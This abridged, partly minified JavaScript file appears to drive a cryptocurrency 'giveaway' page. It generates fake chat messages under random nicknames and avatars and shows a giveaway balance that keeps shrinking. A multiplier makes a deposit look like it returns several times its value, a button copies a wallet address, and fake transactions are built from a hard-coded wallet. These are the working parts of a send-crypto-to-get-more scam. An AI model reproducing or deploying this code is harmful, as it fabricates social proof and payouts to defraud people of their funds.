(() => {
   ...
   let m = document.getElementById("chat-body"),
      h = (setInterval((() => {
         let e = "1" + function (e) {
            ...
            r = d(1, 20);
         o.className = "mess", o.setAttribute("style", "--bg:url(../img/avatar/avatar" + r + ".jpg)"), o.innerHTML = `<div class='msg'><p class="nickname">${e}</p><p class="msg-text">${t}</p></div>`, m.appendChild(o), $("#chat-body").scrollTop($("#chat-body")[0].scrollHeight), u.innerHTML = d(220, 300)
         ...
         var t = {
            ...
            r = function (e) {
               ...
               for (var t, o = String(e), r = o.length, n = -1, i = "", a = o.charCodeAt(0); ++n < r;) {
                  ...
                  i += 1 <= t && t <= 31 || 127 == t || 190 == t || 0 === n && 48 <= t && t <= 57 || 1 === n && 48 <= t && t <= 57 && 45 === a ? "\\" + t.toString(16) + " " : 128 <= t || 45 === t || 95 === t || 48 <= t && t <= 57 || 65 <= t && t <= 90 || 97 <= t && t <= 122 ? o.charAt(n) : "\\" + o.charAt(n)
               }
               return "#" + i
            },
            n = function () {
   ...
   v && v.addEventListener("click", (function () {
      let e = document.querySelector(".copyaddress span").innerHTML;
      y(e)
   }));
   ...
   const R = GIVEAWAY_AMOUNT || 5e5;
   const Redisue = GIVEAWAY_AMOUNT_REDISUE || 3e5;
   localStorage.getItem("procent") || localStorage.setItem("procent", Redisue), A.innerHTML = localStorage.getItem("procent").toLocaleString("ru-RU");
   ...
   N && F && N.addEventListener("input", (function () {
      const n_value = parseFloat(N.value);

      if (!(Number.isNaN(n_value))) {
         F.value = MULTIPLIER * n_value;
      } else {
         F.value = 0;
      }
   }));
   ...
   function D() {
      ...
      let t = H(10),
         ...
         /*123456*/n = "0x2E7cD8B521ED196E70CD12eE0249A9EAC5F1eE9A".substr(0, 10),
         i = function (e, t) {
            let o;
      ...
      function (e) {
         ...
         if (t.closest("[data-goto]")) {
            ...
            ((e, t = !1, o = 500, r = 0) => {
               ...
               a ? (new SmoothScroll).animateScroll(a, "", i) : ''
